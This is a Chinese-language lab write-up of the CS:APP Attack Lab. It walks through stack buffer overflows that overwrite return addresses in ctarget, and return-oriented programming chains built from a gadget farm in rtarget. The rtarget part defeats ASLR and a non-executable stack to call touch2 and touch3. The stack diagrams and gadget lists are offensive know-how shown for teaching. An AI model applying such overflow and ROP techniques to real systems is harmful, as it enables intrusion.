# lab record

Self-Study Handout 下载下来的 README 说明也太少了吧, 官网上的 README 更全一点, 明确指明了需要用 `-q` 选项运行.

writeup 中给出了更详细的信息

## ctarget level 1

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

```
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp           分配了 0x28 个字节
  4017ac:   48 89 e7                mov    %rsp,%rdi            从当前栈顶向高地址输入
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq

0000000000401a40 <Gets>:
  401a40:   41 54                   push   %r12
  401a42:   55                      push   %rbp
  401a43:   53                      push   %rbx
  401a44:   49 89 fc                mov    %rdi,%r12
  401a47:   c7 05 b3 36 20 00 00    movl   $0x0,0x2036b3(%rip)        # 605104 <gets_cnt>
  401a4e:   00 00 00 
  401a51:   48 89 fb                mov    %rdi,%rbx                    buf 地址
  401a54:   eb 11                +--jmp    401a67 <Gets+0x27>
  401a56:   48 8d 6b 01          |  lea    0x1(%rbx),%rbp  <------+     下一个地址
  401a5a:   88 03                |  mov    %al,(%rbx)             |     输入到栈上
  401a5c:   0f b6 f8             |  movzbl %al,%edi               |
  401a5f:   e8 3c ff ff ff       |  callq  4019a0 <save_char>     |
  401a64:   48 89 eb             |  mov    %rbp,%rbx              |
  401a67:   48 8b 3d 62 2a 20 00 +->mov    0x202a62(%rip),%rdi    |   # 6044d0 <infile>
  401a6e:   e8 4d f3 ff ff          callq  400dc0 <_IO_getc@plt>  |
  401a73:   83 f8 ff                cmp    $0xffffffff,%eax       |
  401a76:   74 05                +--je     401a7d <Gets+0x3d>     |
  401a78:   83 f8 0a             |  cmp    $0xa,%eax              |
  401a7b:   75 d9                |  jne    401a56 <Gets+0x16>    -+
  401a7d:   c6 03 00             +->movb   $0x0,(%rbx)                  添加末尾 \0
  401a80:   b8 00 00 00 00          mov    $0x0,%eax
  401a85:   e8 6e ff ff ff          callq  4019f8 <save_term>
  401a8a:   4c 89 e0                mov    %r12,%rax
  401a8d:   5b                      pop    %rbx
  401a8e:   5d                      pop    %rbp
  401a8f:   41 5c                   pop    %r12
  401a91:   c3                      retq   
```

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```
0000000000401968 <test>:
  401968:   48 83 ec 08             sub    $0x8,%rsp
  40196c:   b8 00 00 00 00          mov    $0x0,%eax
  401971:   e8 32 fe ff ff          callq  4017a8 <getbuf>
  401976:   89 c2                   mov    %eax,%edx
  401978:   be 88 31 40 00          mov    $0x403188,%esi
  40197d:   bf 01 00 00 00          mov    $0x1,%edi
  401982:   b8 00 00 00 00          mov    $0x0,%eax
  401987:   e8 64 f4 ff ff          callq  400df0 <__printf_chk@plt>
  40198c:   48 83 c4 08             add    $0x8,%rsp
  401990:   c3                      retq
```

```c
void touch1() {
    vlevel = 1;
    /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

```
00000000004017c0 <touch1>:                                          touch1 的地址为 0x4017c0
  4017c0:   48 83 ec 08             sub    $0x8,%rsp
  4017c4:   c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:   00 00 00 
  4017ce:   bf c5 30 40 00          mov    $0x4030c5,%edi
  4017d3:   e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:   bf 01 00 00 00          mov    $0x1,%edi
  4017dd:   e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:   bf 00 00 00 00          mov    $0x0,%edi
  4017e7:   e8 54 f6 ff ff          callq  400e40 <exit@plt>
```

栈布局如下

```
       +--------+
0x58   |        |
0x60   |        |       Gets 栈帧, 保存了 3 个寄存器
0x68   |        |
       ----------
0x70   |b4174000|       Gets 返回地址
0x78   |        |       从这里开始接收输入
0x80   |        |
0x88   |        |       getbuf 栈帧, 分配了 0x28 个字节
0x90   |        |
0x98   |        |
       ----------
0xa0   |76194000|       getbuf 返回地址
       |  ...   |       test 栈帧
       +--------+
```

所以只要输入大于 0x28 个字节就会覆盖 getbuf 的返回地址, 所以让输入的 [0x28,0x30] (0-index) 个字节的值为 touch1 的地址 0x4017c0 即可

## ctarget level 2

```c
void touch2(unsigned val) {
    vlevel = 2;
    /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

同 level 1 中栈布局, 0xa0 处填上第一次跳转目的地址, 如 0x70

那么在 0x70 处填上给 edi 赋值为 cookie 的机器码, 然后跟一个 ret 指令

注意跳转到注入代码后, rsp 未被修改, 此时 rsp 指向 0xa8, 所以 touch2 的地址(0x4017ec)应该填在 0xa8, 然后 ret 指令将 rip 赋值为 0x4017ec, 最后跳转到了 touch2.

## ctarget level 3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3;
    /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

touch3 会调用函数 hexmatch, hexmatch 会调用 strncmp, 意味着栈会向低地址生长.

为避免注入代码被覆盖, 先将 rsp 从 0xa8 减小到 0x88, 然后以此为界限向高地址存放数据, 向低地址存放注入代码.

按如下设计栈

```
       +--------+
0x58   |        |
0x60   |        |       Gets 栈帧, 保存了 3 个寄存器
0x68   |        |
       ----------
0x70   |b4174000|       Gets 返回地址
0x78   |        |       从这里开始接收输入
0x80   |        |
0x88   |&touch3 |<-- rsp     getbuf 栈帧, 分配了 0x28 个字节
0x90   | cookie |
0x98   |   0    |       字符串结束 \0
       ----------
0xa0   |76194000|       getbuf 返回地址
0xa8   |  ...   |       test 栈帧
       +--------+
```

## rtarget level 2

奇怪没有 level 1, 直接从 level 2 开始.

地址空间布局随机初始化(ASLR), 加上不可执行栈, 使得在栈上注入代码困难.

于是不直接注入代码, 而是利用汇编编译器生成的代码(机器码是一个二进制流, 同样一个流, 从不同的地方开始解析有不同的含义).

```c
void touch2(unsigned val) {
    vlevel = 2;
    /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

```
0000000000401994 <start_farm>:
  401994:   b8 01 00 00 00          mov    $0x1,%eax
  401999:   c3                      retq   

000000000040199a <getval_142>:
  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax
  40199f:   c3                      retq   

00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq   

00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq   

00000000004019ae <setval_237>:
  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
  4019b4:   c3                      retq   

00000000004019b5 <setval_424>:
  4019b5:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
  4019bb:   c3                      retq   

00000000004019bc <setval_470>:
  4019bc:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
  4019c2:   c3                      retq   

00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq   

00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq   

00000000004019d0 <mid_farm>:
  4019d0:   b8 01 00 00 00          mov    $0x1,%eax
  4019d5:   c3                      retq
```

这个同样是需要调用 touch2, 要处理传参问题, 即需要修改 rdi 或者 edi 寄存器的内容; 并且 cookie 的值必须从栈传递, 即必须 pop 到某个寄存器.

- 思路一: 看看有没有直接的 popq %rdi, 对应机器码 0x5f, 在 start_farm 和 mid_farm 之间的反汇编代码中寻找, 发现没有.
- 思路二: 没有直接的 popq %rdi, 那应该是先 pop 到了某一个寄存器(设需要指令 ins_1), 再从一个寄存器转移到 rdi(设需要指令 ins_2),这也印证了提示需要两个 gadget.

对于 pop 指令, 允许的操作对象为前 8 个寄存器, 那么其机器码一定为 0x5?, 一查找, 发现 0x5? 的机器码不多, 唯一有可能的便是 `58 90 c3`(注意出现了两处, 随便用一处即可), 翻译一下

```
58      popq %rax
90      nop
c3      ret
```

完美, 先把 cookie 移动到 %rax(ins_1), 然后一个 nop, 最后再一个 ret 跳转到 ins_2.

那么接下来需要寻找指令 `mov %rax, %rdi`(ins_2), 其机器码为 `48 89 c7`, 在 farm 中找到有三处, 并且有两处后边有 ret 可以让我们最终跳转到 touch2, 问题解决.

按如下设计注入

```
            +--------+
            |        |
            |        |       Gets 栈帧, 保存了 3 个寄存器
            |        |
            ----------
            |        |       Gets 返回地址
&buf        |        |       从这里开始接收输入
            |        |
            |        |       getbuf 栈帧, 分配了 0x28 个字节
            |        |
&buf+0x28   |        |
            ----------
&buf+0x30   | &ins_1 |       getbuf 返回地址
            | cookie |       test 栈帧
            | &ins_2 |
            | &touch2|
            +--------+
```

## rtarget level 3

> You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
> ...
> Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require.

老外的文档还是挺有意思的, 居然让人放弃, 显然是欲擒故纵啊, 不过成功地引起了我的兴趣. 嗯, 就是好了前两天拆炸弹最后一个 phase 的伤疤忘了疼.

废话不多说, 正式开始.

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3;
    /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

总的方向: 这里需要 cookie 字符串在栈上的指针, 由于地址空间布局随机初始化, 我们不能去设计一个具体的地址, 那么只有利用 rsp 做文章了. 要做的核心就是 `rsp -> rdi`

先找一下可用的 gadget, 这段人工反汇编有点累...

```
0000000000401994 <start_farm>:
  401994:   b8 01 00 00 00          mov    $0x1,%eax
  401999:   c3                      retq   

000000000040199a <getval_142>:
  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax
  40199f:   c3                      retq   

00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq   

        :   48 89 c7                mov     %rax,%rdi
        :   c3                      retq    

        :   89 c7                   mov     %eax,%edi
        :   c3                      retq    

00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq   

        :   58                      pop     %rax
        :   90                      nop     
        :   c3                      retq

00000000004019ae <setval_237>:
  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
  4019b4:   c3                      retq   

00000000004019b5 <setval_424>:
  4019b5:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
  4019bb:   c3                      retq   

00000000004019bc <setval_470>:
  4019bc:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
  4019c2:   c3                      retq   

00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq   

00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq   

00000000004019d0 <mid_farm>:
  4019d0:   b8 01 00 00 00          mov    $0x1,%eax
  4019d5:   c3                      retq   

00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq   

00000000004019db <getval_481>:
  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:   c3                      retq   

        :   5c                      popq   %rsp
        :   89 c2                   mov    %eax, %edx
        :   90                      nop
        :   c3                      retq

00000000004019e1 <setval_296>:
  4019e1:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)
  4019e7:   c3                      retq   

00000000004019e8 <addval_113>:
  4019e8:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
  4019ee:   c3                      retq   

00000000004019ef <addval_490>:
  4019ef:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax
  4019f5:   c3                      retq   

        :   20 db                   andb   %bl, %bl
        :   c3                      retq

00000000004019f6 <getval_226>:
  4019f6:   b8 89 d1 48 c0          mov    $0xc048d189,%eax
  4019fb:   c3                      retq   

00000000004019fc <setval_384>:
  4019fc:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)
  401a02:   c3                      retq   

        :   84 c0                   testb  %al,%al
        :   c3                      retq   

0000000000401a03 <addval_190>:
  401a03:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
  401a09:   c3                      retq   

        :   48 89 e0                mov    %rsp,%rax
        :   c3                      retq    

        :   89 e0                   mov    %esp,%eax
        :   c3                      retq    

0000000000401a0a <setval_276>:
  401a0a:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)
  401a10:   c3                      retq   

        :   08 c9                   orb    %cl,%cl
        :   c3                      retq   

0000000000401a11 <addval_436>:
  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:   c3                      retq   

        :   89 ce                   mov    %ecx,%esi
        :   90                      nop
        :   90                      nop
        :   c3                      retq

0000000000401a18 <getval_345>:
  401a18:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax
  401a1d:   c3                      retq   

0000000000401a1e <addval_479>:
  401a1e:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax
  401a24:   c3                      retq   

0000000000401a25 <addval_187>:
  401a25:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
  401a2b:   c3                      retq   

        :   89 ce                   mov     %ecx,%esi
        :   38 c0                   cmpb    %al,%al
        :   c3                      retq    

0000000000401a2c <setval_248>:
  401a2c:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)
  401a32:   c3                      retq   

        :   08 db                   orb    %bl,%bl
        :   c3                      retq   

0000000000401a33 <getval_159>:
  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
  401a38:   c3                      retq   

        :   89 d1                   mov    %edx,%ecx
        :   38 c9                   cmpb   %cl,%cl
        :   c3                      retq   

0000000000401a39 <addval_110>:
  401a39:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
  401a3f:   c3                      retq   

0000000000401a40 <addval_487>:
  401a40:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
  401a46:   c3                      retq   

        :   89 c2                   mov    %eax,%edx
        :   84 c0                   testb  %al,%al
        :   c3                      retq   

0000000000401a47 <addval_201>:
  401a47:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
  401a4d:   c3                      retq   

0000000000401a4e <getval_272>:
  401a4e:   b8 99 d1 08 d2          mov    $0xd208d199,%eax
  401a53:   c3                      retq   

        :   08 d2                   orb    %dl,%dl
        :   c3                      retq

0000000000401a54 <getval_155>:
  401a54:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax
  401a59:   c3                      retq   

0000000000401a5a <setval_299>:
  401a5a:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
  401a60:   c3                      retq   

0000000000401a61 <addval_404>:
  401a61:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax
  401a67:   c3                      retq   

0000000000401a68 <getval_311>:
  401a68:   b8 89 d1 08 db          mov    $0xdb08d189,%eax
  401a6d:   c3                      retq   

        :   89 d1                   mov    %edx,%ecx
        :   08 db                   orb    %bl,%bl
        :   c3                      retq   

0000000000401a6e <setval_167>:
  401a6e:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
  401a74:   c3                      retq   

0000000000401a75 <setval_328>:
  401a75:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)
  401a7b:   c3                      retq   

        :   38 d2                   cmpb   %dl,%dl
        :   c3                      retq   

0000000000401a7c <setval_450>:
  401a7c:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)
  401a82:   c3                      retq   

        :   08 c9                   orb    %cl,%cl
        :   c3                      retq   

0000000000401a83 <addval_358>:
  401a83:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
  401a89:   c3                      retq   

        :   89 e0
        :   90
        :   c3

0000000000401a8a <addval_124>:
  401a8a:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax
  401a90:   c3                      retq   

0000000000401a91 <getval_169>:
  401a91:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax
  401a96:   c3                      retq   

        :   20 c0                   andb   %al,%al
        :   c3                      retq

0000000000401a97 <setval_181>:
  401a97:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)
  401a9d:   c3                      retq   

0000000000401a9e <addval_184>:
  401a9e:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax
  401aa4:   c3                      retq   

0000000000401aa5 <getval_472>:
  401aa5:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax
  401aaa:   c3                      retq   

        :   20 d2                   andb   %dl,%dl
        :   c3                      retq   

0000000000401aab <setval_350>:
  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:   c3                      retq   

0000000000401ab2 <end_farm>:
  401ab2:   b8 01 00 00 00          mov    $0x1,%eax
  401ab7:   c3                      retq   
  401ab8:   90                      nop
  401ab9:   90                      nop
  401aba:   90                      nop
  401abb:   90                      nop
  401abc:   90                      nop
  401abd:   90                      nop
  401abe:   90                      nop
  401abf:   90                      nop
```

整理一下

```
        :   48 89 c7                mov     %rax,%rdi
        :   c3                      retq    

        :   89 c7                   mov     %eax,%edi
        :   c3                      retq    

        :   58                      pop     %rax
        :   90                      nop     
        :   c3                      retq

        :   5c                      popq   %rsp
        :   89 c2                   mov    %eax, %edx
        :   90                      nop
        :   c3                      retq

        :   20 db                   andb   %bl, %bl
        :   c3                      retq

        :   84 c0                   testb  %al,%al
        :   c3                      retq   

        :   48 89 e0                mov    %rsp,%rax
        :   c3                      retq    

        :   89 e0                   mov    %esp,%eax
        :   c3                      retq    

        :   08 c9                   orb    %cl,%cl
        :   c3                      retq   

        :   89 ce                   mov    %ecx,%esi
        :   90                      nop
        :   90                      nop
        :   c3                      retq

        :   89 ce                   mov     %ecx,%esi
        :   38 c0                   cmpb    %al,%al
        :   c3                      retq    

        :   08 db                   orb    %bl,%bl
        :   c3                      retq   

        :   89 d1                   mov    %edx,%ecx
        :   38 c9                   cmpb   %cl,%cl
        :   c3                      retq   

        :   89 c2                   mov    %eax,%edx
        :   84 c0                   testb  %al,%al
        :   c3                      retq

        :   08 d2                   orb    %dl,%dl
        :   c3                      retq

        :   89 d1                   mov    %edx,%ecx
        :   08 db                   orb    %bl,%bl
        :   c3                      retq   

        :   38 d2                   cmpb   %dl,%dl
        :   c3                      retq   

        :   08 c9                   orb    %cl,%cl
        :   c3                      retq   

        :   20 c0                   andb   %al,%al
        :   c3                      retq

        :   20 d2                   andb   %dl,%dl
        :   c3                      retq   
```

发现涉及到 rsp 的有三处

```asm
58        pop     %rax
90        nop     
c3        retq


48 89 e0  mov    %rsp,%rax
c3        retq


5c        popq   %rsp
89 c2     mov    %eax, %edx
90        nop
c3        retq
```

由于地址空间布局随机初始化, `popq %rsp` 对我们来说没什么用, 所以可以利用的就是前两处, 前者可以用来传栈上的数据到寄存器, 后者可以知道栈顶位置.

观察可用的 gadget, 只会让栈指针增大(单调的, 意味着我们对 gadget 调用顺序是按栈地址从低到高依次顺序调用), 那么我们必须把 cookie 放最后(高地址), &touch3 次之, 这样才能保证 cookie 不被覆盖.

观察可能的数据流动方向

```
rsp --> rax --> rdi

esp
 |
 +---> eax --> edx --> ecx --> esi
 |
edi
```

`rsp --> rdi` 需要中途经过 rax, 这里至少需要两个 gadget, 并且 rsp 传到 rdi 的值不可能直接是 &cookie(中间存在 ret, 会修改 rsp), 意味着我们将 rsp 赋值给 rdi 后, 还需要对 rdi 进行修正.

查看 dadget, 发现了一个 lea 指令(`lea    (%rdi,%rsi,1),%rax`)可以用来调整 rdi, 问题可以解决.

大体流程如下

```
rsp --> rax --> rdi --修正--> rdi
```

修正时需要借助 rsi, 利用数据流 `eax --> edx --> ecx --> esi` 将修正量 `delta` 传给 esi.

用到的 8 个 dadget 如下(省略了部分指令, 如 nop, cmpb 等), 与 writeup 中说的数量相同

```
g0:     pop     rax                    ---
        ret                             |
                                        |
g1:     mov     eax, edx                |
        ret                             |
                                传递 delta 给 esi
g2:     mov     edx, ecx                |
        ret                             |
                                        |
g3:     mov     ecx, esi                |
        ret                            ---
        
g4:     mov     rsp, rax               ---
        ret                             |
                                   获得栈顶地址 
g5:     mov     rax, rdi                |
        ret                            ---
                                        |
g6:     lea     (rdi, rsi, 1), rax      |
        ret                        修正 rdi
                                        |
g7      mov     rax, rdi                |
        ret                            ---
```

按如下注入代码

```
                +--------+
                |        |
                |        |       Gets 栈帧, 保存了 3 个寄存器
                |        |
                ----------
                |        |       Gets 返回地址
&buf:           |        |       从这里开始接收输入
                |        |
                |        |       getbuf 栈帧, 分配了 0x28 个字节
                |        |
&buf + 0x20:    |        |
&buf + 0x28:    | &g0    |       getbuf 返回地址
&buf + 0x30:    | delta  |
&buf + 0x38:    | &g1    |
&buf + 0x40:    | &g2    |
&buf + 0x48:    | &g3    |
&buf + 0x50:    | &g4    |
&buf + 0x58:    | &g5    |
&buf + 0x60:    | &g6    |
&buf + 0x68:    | &g7    |
&buf + 0x70:    | &touch3|
&buf + 0x78:    | cookie |
&buf + 0x80:    | \0     |       结束的 \0 不是必须的, 因为 Gets 会自动在末尾附加 \0
                ----------
```

最后说一下关于 `delta` 的计算, 在获取栈顶指针时(执行 g4), 此时 rsp 指向 g5, `&cookie - &g5 = 0x20`, 所以 `delta` 应该是 0x20.
